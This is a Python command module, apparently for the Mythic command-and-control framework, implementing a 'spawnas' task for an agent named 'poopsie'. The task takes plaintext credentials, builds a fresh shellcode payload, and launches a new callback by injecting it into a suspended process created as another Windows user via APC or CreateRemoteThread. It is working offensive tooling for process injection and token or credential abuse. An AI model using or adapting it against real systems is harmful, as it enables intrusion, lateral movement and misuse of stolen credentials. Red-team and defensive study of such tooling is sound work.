from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import asyncio
import json


class SpawnAsArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="uuid",
                cli_name="Payload",
                display_name="Payload Template (Shellcode)",
                type=ParameterType.Payload,
                supported_agents=["poopsie"],
                supported_agent_build_parameters={"poopsie": {"output_type": "Shellcode"}},
                parameter_group_info=[
                    ParameterGroupInfo(required=True, ui_position=1, group_name="credential_store"),
                    ParameterGroupInfo(required=True, ui_position=1, group_name="manual"),
                ],
            ),
            CommandParameter(
                name="credential",
                cli_name="Credential",
                display_name="Credential",
                type=ParameterType.Credential_JSON,
                limit_credentials_by_type=["plaintext"],
                parameter_group_info=[ParameterGroupInfo(
                    group_name="credential_store",
                    required=True,
                    ui_position=2
                )]
            ),
            CommandParameter(
                name="username",
                cli_name="username",
                display_name="Username",
                type=ParameterType.String,
                description="Username for authentication",
                parameter_group_info=[ParameterGroupInfo(
                    group_name="manual",
                    required=True,
                    ui_position=2
                )]
            ),
            CommandParameter(
                name="password",
                cli_name="password",
                display_name="Password",
                type=ParameterType.String,
                description="Password for authentication",
                parameter_group_info=[ParameterGroupInfo(
                    group_name="manual",
                    required=True,
                    ui_position=3
                )]
            ),
            CommandParameter(
                name="domain",
                cli_name="domain",
                display_name="Domain",
                type=ParameterType.String,
                description="Domain name (use '.' for local)",
                default_value=".",
                parameter_group_info=[
                    ParameterGroupInfo(group_name="credential_store", ui_position=3),
                    ParameterGroupInfo(group_name="manual", ui_position=4),
                ]
            ),
            CommandParameter(
                name="technique",
                cli_name="technique",
                display_name="Injection Technique",
                type=ParameterType.ChooseOne,
                default_value="apc",
                choices=["apc", "createremotethread"],
                description="Injection technique to use.",
                parameter_group_info=[
                    ParameterGroupInfo(group_name="credential_store", required=True, ui_position=4),
                    ParameterGroupInfo(group_name="manual", required=True, ui_position=5),
                ]
            ),
            CommandParameter(
                name="netonly",
                cli_name="netonly",
                display_name="Network Only Logon",
                type=ParameterType.Boolean,
                description="Use LOGON_NETCREDENTIALS_ONLY (credentials for network access only)",
                default_value=False,
                parameter_group_info=[
                    ParameterGroupInfo(group_name="credential_store", ui_position=5),
                    ParameterGroupInfo(group_name="manual", ui_position=6),
                ]
            ),
        ]

    async def parse_arguments(self):
        self.load_args_from_json_string(self.command_line)
        if self.get_parameter_group_name() == "credential_store":
            credential = self.get_arg("credential")
            if credential:
                try:
                    cred_data = json.loads(credential)
                    self.add_arg("username", cred_data.get("account", ""))
                    self.add_arg("password", cred_data.get("credential", ""))
                    if "realm" in cred_data and cred_data["realm"]:
                        self.add_arg("domain", cred_data["realm"])
                except Exception as e:
                    raise ValueError(f"Failed to parse credential JSON: {e}")


class SpawnAsCommand(CommandBase):
    cmd = "spawnas"
    needs_admin = False
    help_cmd = "spawnas (modal popup)"
    description = "Spawn a new callback as another user. Creates a suspended process as the specified user using CreateProcessWithLogonW and injects the payload. The payload template must be shellcode."
    version = 2
    author = "@haha150"
    argument_class = SpawnAsArguments
    attackmapping = ["T1055", "T1134"]
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )

        payload_search = await SendMythicRPCPayloadSearch(
            MythicRPCPayloadSearchMessage(
                CallbackID=taskData.Callback.ID,
                PayloadUUID=taskData.args.get_arg("uuid"),
            )
        )

        newPayloadResp = await SendMythicRPCPayloadCreateFromUUID(
            MythicRPCPayloadCreateFromUUIDMessage(
                TaskID=taskData.Task.ID,
                PayloadUUID=taskData.args.get_arg("uuid"),
                NewDescription="{}'s spawnas session from task {}".format(
                    taskData.Task.OperatorUsername, str(taskData.Task.DisplayID)
                ),
            )
        )

        if newPayloadResp.Success:
            while True:
                resp = await SendMythicRPCPayloadSearch(
                    MythicRPCPayloadSearchMessage(
                        PayloadUUID=newPayloadResp.NewPayloadUUID,
                    )
                )
                if resp.Success:
                    if resp.Payloads[0].BuildPhase == "success":
                        taskData.args.add_arg("uuid", resp.Payloads[0].AgentFileId)
                        username = taskData.args.get_arg("username")
                        domain = taskData.args.get_arg("domain")
                        technique = taskData.args.get_arg("technique")
                        response.DisplayParams = "as {}\\{} via {} from '{}'".format(
                            domain, username, technique,
                            payload_search.Payloads[0].Description if payload_search.Success and len(payload_search.Payloads) > 0 else "unknown"
                        )
                        break
                    elif resp.Payloads[0].BuildPhase == "error":
                        raise Exception("Failed to build new payload")
                    elif resp.Payloads[0].BuildPhase == "building":
                        await asyncio.sleep(2)
                    else:
                        raise Exception(resp.Payloads[0].BuildPhase)
                else:
                    raise Exception(resp.Error)
        else:
            raise Exception("Failed to start build process")

        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
